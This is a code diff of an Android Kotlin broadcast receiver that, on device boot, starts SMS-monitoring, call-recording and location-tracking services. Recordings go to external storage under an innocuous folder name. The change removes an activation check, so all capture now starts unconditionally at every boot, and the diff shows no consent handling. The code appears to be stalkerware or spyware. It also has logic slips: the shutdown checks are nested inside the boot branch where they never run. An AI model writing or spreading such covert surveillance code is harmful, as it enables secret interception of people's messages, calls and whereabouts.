@@ -40,43 +40,37 @@ import java.util.*
 class SMSreceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         if ("android.intent.action.BOOT_COMPLETED" == intent.action) {
-            if (RealmUtils.isActive())
-                context.runOnUiThread {
-               //     scheduleJob(context)
-                    RealmUtils.savePowerOnOff(true)
-                    val listPowCaching = RealmUtils.getAllPowerCaching()
-                    listPowCaching?.let {
-                        it.forEachIndexed { _, powCaching ->
-                            sendPowerCaching(powCaching.id, powCaching.datecreate, powCaching.isPowerOn)
-                        }
-                    }
-                    updateInformation()
-                    val intentSms = Intent(context, SmsRadarService::class.java)
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        context.startForegroundService(intentSms)
-                    } else {
-                        context.startService(intentSms)
-                    }
-                    //Call
-                    var callRecord = CallRecord.Builder(context)
-                            .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
-                            .setRecordDirName("Historycontact")
-                            .setRecordDirPath(Environment.getExternalStorageDirectory().path)
-                            .setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                            .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                            .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
-                            .setShowSeed(true)
-                            .build()
+            Log.e("antx", "onReceive sms BOOT_COMPLETED")
+            //Handler Power
+            RealmUtils.savePowerOnOff(true)
 
-                    callRecord.startCallRecordService()
-                    val intent = Intent()
-                    intent.setClass(context, LocationService::class.java)
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        context.startForegroundService(intent)
-                    } else {
-                        context.startService(intent)
-                    }
-                }
+            //  updateInformation()
+            val intentSms = Intent(context, SmsRadarService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(intentSms)
+            } else {
+                context.startService(intentSms)
+            }
+            //Call
+            var callRecord = CallRecord.Builder(context)
+                    .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
+                    .setRecordDirName("Historycontact")
+                    .setRecordDirPath(Environment.getExternalStorageDirectory().path)
+                    .setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                    .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                    .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
+                    .setShowSeed(true)
+                    .build()
+
+            callRecord.startCallRecordService()
+            val intent = Intent()
+            intent.setClass(context, LocationService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(intent)
+            } else {
+                context.startService(intent)
+            }
+
             //Location
             if ("android.intent.action.QUICKBOOT_POWEROFF" == intent.action) {
                 RealmUtils.savePowerOnOff(false)
@@ -84,8 +78,6 @@ class SMSreceiver : BroadcastReceiver() {
             if ("android.intent.action.ACTION_SHUTDOWN" == intent.action) {
                 RealmUtils.savePowerOnOff(false)
             }
-
-
         }
     }
 
